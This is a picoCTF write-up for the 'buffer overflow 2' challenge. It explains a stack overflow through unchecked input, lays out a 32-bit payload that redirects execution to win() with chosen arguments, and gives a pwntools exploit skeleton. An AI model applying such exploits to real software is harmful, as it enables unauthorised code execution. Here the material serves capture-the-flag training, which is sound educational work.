---
title: "picoCTF: buffer overflow 2"
date: 2026-02-28
ctf: "picoCTF"
difficulty: "Easy"
tags: ["pwn", "buffer-overflow", "arguments"]
summary: "Buffer overflow used to control function arguments and trigger win()."
---

## Overview
This challenge extends the basic buffer overflow by requiring control of function arguments when calling `win()`.

## Vulnerability
The program reads user input into a fixed-size buffer without bounds checking (e.g., `gets()` or similar), allowing overwrite of the saved return address and stack data.

## Exploitation goal
Redirect execution to `win()` and place the expected values on the stack as arguments (cdecl-style layout).

## Payload layout (typical 32-bit)
- padding to EIP
- `win()` address
- fake return address
- `arg1`
- `arg2`

## Example pwntools skeleton
```python
from pwn import *

offset = 44
win = 0x08049296  # replace with your win() address

payload  = b"A" * offset
payload += p32(win)
payload += b"BBBB"              # fake ret
payload += p32(0xdeadbeef)      # arg1 (example)
payload += p32(0xcafebabe)      # arg2 (example)

# p = process("./vuln")
# p.sendline(payload)
# p.interactive()